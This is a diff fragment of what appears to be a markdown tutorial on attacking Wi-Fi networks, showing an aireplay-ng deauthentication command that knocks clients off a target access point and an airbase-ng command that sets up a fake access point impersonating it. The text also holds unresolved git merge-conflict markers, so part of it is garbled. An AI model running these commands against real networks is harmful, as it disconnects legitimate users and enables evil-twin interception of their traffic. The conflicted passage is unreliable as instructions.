@@ -67,7 +67,11 @@ aireplay-ng -0 0 -a C4:71:54:23:2A:AE -c EC:D0:9F:87:DD:6F  wlan0mon
 
 -c : the client that connect to AP legally. if not spcecif which client , it will disconnect all the clients which connect to this WI-FI
 
+<<<<<<< HEAD
 ## 4. Set up a fake AP impersonating the target AP
+=======
+the client will be disconnected from the AP we input above 
+>>>>>>> 04935ebf4a4be8179254a08752a48a98cbff9630
 
 ```
 airbase-ng -a AA:AA:AA:AA:AA:AA --essid 'BeautifulSoup' -c 11 wlan0mon
